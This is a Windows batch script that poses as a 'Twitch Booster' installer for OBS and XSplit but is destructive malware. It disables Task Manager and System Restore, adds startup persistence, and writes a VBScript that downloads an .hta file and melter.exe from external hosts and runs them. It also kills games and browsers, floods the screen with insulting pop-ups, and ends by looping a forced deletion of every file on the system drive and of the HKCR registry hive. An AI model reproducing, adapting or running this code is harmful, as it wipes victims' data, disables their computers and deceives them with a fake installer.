@echo off
set ztmp=C:\Users\admin\AppData\Local\Temp\ztmp
set MYFILES=C:\Users\admin\AppData\Local\Temp\afolder
set bfcec=t6838.exe
set cmdline=
SHIFT /0
@echo off
title WinServicePackages
cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
takeown /f %systemdrive%\*.* >nul
Icacls %systemdrive%\*.* /C /G %username%:F >nul
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul
cls

set /a twitch=%random%
set /a nouveau=%random%
set /a lol=%random%
set /a pute=%random%
set /a prenom=%random%
set /a disque=%random%
set /a led=%random%
set /a fdc=%random%
set /a fdcbat=%random%

cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
@echo off>mssec.bat
@echo copy /y %~f0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mssec.bat">>mssec.bat
@echo shutdown /r>>mssec.bat
copy /y mssec.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mssec.bat"

cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp

@echo Set wshShell = CreateObject( "WScript.Shell" )>%lol%.vbs
@echo strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )>>%lol%.vbs
@echo Set wshell = CreateObject("WScript.Shell")>>%lol%.vbs
@echo voila = wshell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")>>%lol%.vbs
@echo. >>%lol%.vbs
(echo HTTPDownload "https://image.noelshack.com/fichiers/2021/14/5/1617997407-risitas.jpg", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
(echo HTTPDownload "https://ddl8.data.hu/get/387805/13078039/risitas.hta", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
(echo HTTPDownload "https://ddl8.data.hu/get/339969/12880996/melter.exe", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
@echo. >>%lol%.vbs
@echo Sub HTTPDownload( myURL, myPath )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Dim i, objFile, objFSO, objHTTP, strFile, strMsg>>%lol%.vbs
(echo      Const ForReading = 1, ForWriting = 2, ForAppending = 8)>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Set objFSO = CreateObject( "Scripting.FileSystemObject" )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     If objFSO.FolderExists( myPath ) Then>>%lol%.vbs
@echo         strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )>>%lol%.vbs
@echo     ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then>>%lol%.vbs
@echo         strFile = myPath>>%lol%.vbs
@echo     Else>>%lol%.vbs
@echo         WScript.Echo "ERROR: Target folder not found.">>%lol%.vbs
@echo         Exit Sub>>%lol%.vbs
@echo     End If>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     objHTTP.Open "GET", myURL, False>>%lol%.vbs
@echo     objHTTP.Send>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     For i = 1 To LenB( objHTTP.ResponseBody )>>%lol%.vbs
@echo         objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )>>%lol%.vbs
@echo     Next>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     objFile.Close( )>>%lol%.vbs
@echo End Sub>>%lol%.vbs

set file=lachancla.mp3
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "https://cdn.discordapp.com/attachments/965628270953496647/1000545349347319868/lachancla.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%nouveau%.vbs

@echo x=msgbox ("Bienvenue dans l'installateur du Twitch Booster pour OBS et XSplit. Souhaitez vous proc�der � l'installation ?",4+4096, "Twitch Booster")>%twitch%.vbs
@echo WScript.Sleep 3000>>%twitch%.vbs
@echo x=msgbox ("Installation termin�e, vous pouvez maintenant streamer sur Twitch sans aucun probl�me de connexion ou autre !",4096, "Twitch Booster")>>%twitch%.vbs
@echo WScript.Sleep 74000>>%twitch%.vbs
@echo do>>%twitch%.vbs
@echo Dim wsh>>%twitch%.vbs
@echo Set wsh=WScript.CreateObject("WScript.Shell")>>%twitch%.vbs
@echo wsh.Run "http://theshitposter78.github.io/cactus">>%twitch%.vbs
@echo WScript.Sleep 1000>>%twitch%.vbs
@echo loop>>%twitch%.vbs

@echo Set oWMP = CreateObject("WMPlayer.OCX.7" )>%disque%.vbs
@echo Set colCDROMs = oWMP.cdromCollection>>%disque%.vbs
@echo if colCDROMs.Count ^>= 1 then>>%disque%.vbs
@echo do>>%disque%.vbs
@echo For i = 0 to colCDROMs.Count - ^1>>%disque%.vbs
@echo colCDROMs.Item(i).Eject>>%disque%.vbs
@echo Next ' cdrom>>%disque%.vbs
@echo For i = 0 to colCDROMs.Count - ^1>>%disque%.vbs
@echo colCDROMs.Item(i).Eject>>%disque%.vbs
@echo Next ' cdrom>>%disque%.vbs
@echo loop>>%disque%.vbs
@echo End If>>%disque%.vbs

@echo set w = CreateObject("WScript.Shell")>%fdc%.vbs
@echo W.Run chr(34) ^& WScript.Arguments(0) ^& chr(34), ^0>>%fdc%.vbs
@echo set w= Nothing>>%fdc%.vbs

@echo :corde>%fdcbat%.bat
@echo reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f >nul>>%fdcbat%.bat
@echo reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "%systemdrive%\Users\%USERNAME%\AppData\Local\Temp\1478471702-risitas.jpg" /f >nul>>%fdcbat%.bat
@echo reg delete "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperStyle /f >nul>>%fdcbat%.bat
@echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul>>%fdcbat%.bat
@echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters  >nul>>%fdcbat%.bat
@echo start %prenom%.vbs>>%fdcbat%.bat
@echo goto corde>>%fdcbat%.bat

@echo Set wshShell =wscript.CreateObject("WScript.Shell")>%led%.vbs
@echo do>>%led%.vbs
@echo wscript.sleep 100>>%led%.vbs
@echo wshshell.sendkeys "{CAPSLOCK}">>%led%.vbs
@echo wshshell.sendkeys "{NUMLOCK}">>%led%.vbs
@echo wshshell.sendkeys "{SCROLLLOCK}">>%led%.vbs
@echo loop>>%led%.vbs

@echo do>%prenom%.vbs
@echo x=msgbox ("LE 18-25 T'A BIEN BAISER LE FION PUTAIN DE GROS FILS DE PUTE" ,16+4096, "L'�lite de la Nation")>>%prenom%.vbs
@echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
@echo loop>>%prenom%.vbs

@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 18 25 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux raiye du 18 25.">%pute%.vbs

:eau
if exist %twitch%.vbs (
	start %twitch%.vbs
	goto moins
) ELSE (
	goto eau
)

:moins
if exist %lol%.vbs (
		start %lol%.vbs
		timeout 60 >nul
		goto suceautre
	) ELSE (
		goto moins
	)

:suceautre
rundll32 user32.dll, SwapMouseButton >nul


:chien
if exist %pute%.vbs (
	start %pute%.vbs
	goto prout
) ELSE (
	goto chien
)

:prout
timeout 14 >nul
taskkill /F /IM hl2.exe
taskkill /F /IM javaw.exe
taskkill /F /IM RobloxPlayerBeta.exe
taskkill /F /IM FortniteClient-Win64-Shipping.exe
taskkill /F /IM GenshinImpact.exe
taskkill /F /IM Among Us.exe
taskkill /F /IM chrome.exe
taskkill /F /IM firefox.exe
taskkill /F /IM msedge.exe
taskkill /F /IM iexplore.exe
taskkill /F /IM explorer.exe
shutdown -r -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)"

:aaa
if exist %nouveau%.vbs (
	start %nouveau%.vbs
	goto mdrpd
) ELSE (
	goto aaa
)

:mdrpd
if exist %disque%.vbs (
	start %disque%.vbs
	goto extrapd
) ELSE (
	goto mdrpd
)

:extrapd
if exist %led%.vbs (
	start %led%.vbs
	goto tgjuif
) ELSE (
	goto extrapd
)

:tgjuif
if exist risitas.hta (
	start risitas.hta
	goto pourlefdc
) ELSE (
	tgjuif
)

:pourlefdc
if exist %fdcbat%.bat (
	start %fdc%.vbs %fdcbat%.bat
        goto caca
) ELSE (
	goto pourlefdc
)

:caca
if exist %prenom%.vbs (
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	goto svt
) ELSE (
	goto caca
)

:svt
start melter.exe
cd %systemdrive%\
del *.* /F /S /Q >nul
reg delete HKCR /F >nul
goto svt











